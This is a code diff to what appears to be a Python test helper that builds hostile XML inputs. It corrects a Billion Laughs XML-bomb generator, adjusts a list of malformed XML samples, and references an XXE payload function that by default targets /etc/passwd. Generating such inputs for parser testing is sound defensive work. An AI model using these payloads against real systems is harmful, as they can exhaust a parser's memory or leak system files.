@@ -14,12 +14,15 @@ def generate_xxe_payload(target_path: str = "/etc/passwd") -> str:
 
 def generate_billion_laughs() -> str:
     """Return a classic Billion Laughs (XML bomb) payload with depth 6."""
-    entities = "\n".join(f"<!ENTITY l{i} '&l{i - 1};&l{i - 1};&l{i - 1};'>" for i in range(1, 7))
+    entities = ["<!ENTITY lol 'lol'>"]
+    previous = "lol"
+    for index in range(1, 7):
+        entities.append(f"<!ENTITY l{index} '&{previous};&{previous};&{previous};'>")
+        previous = f"l{index}"
     return (
         "<?xml version='1.0' encoding='UTF-8'?>"
         "<!DOCTYPE lolz ["
-        "<!ENTITY lol 'lol'>"
-        f"{entities}"
+        f"{''.join(entities)}"
         "]>"
         "<lolz>&l6;</lolz>"
     )
@@ -45,6 +48,6 @@ def generate_malformed_xml() -> list[str]:
         "<root>&#x0;</root>",
         "<root><![CDATA[</root>",
         '<!DOCTYPE html [<!ENTITY x "&y;">]><root>&x;</root>',
-        "<?xml version='1.0'?><root/>",
+        "<?xml version='1.0'?><root></root><orphan>",
         "<root>" + "A" * 100000 + "</root>",
     ]
